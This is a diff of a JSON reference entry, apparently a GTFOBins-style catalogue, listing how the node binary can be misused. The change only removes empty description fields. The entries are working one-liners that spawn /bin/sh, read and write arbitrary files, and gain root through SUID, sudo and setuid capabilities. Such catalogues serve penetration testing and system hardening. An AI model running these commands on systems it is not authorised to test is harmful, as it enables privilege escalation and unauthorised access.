@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
       }
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'\n"
       }
     ],
@@ -44,19 +44,19 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
       }
     ],
     "capabilities": [
       {
-        "description": "",
+        
         "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
       }
     ]
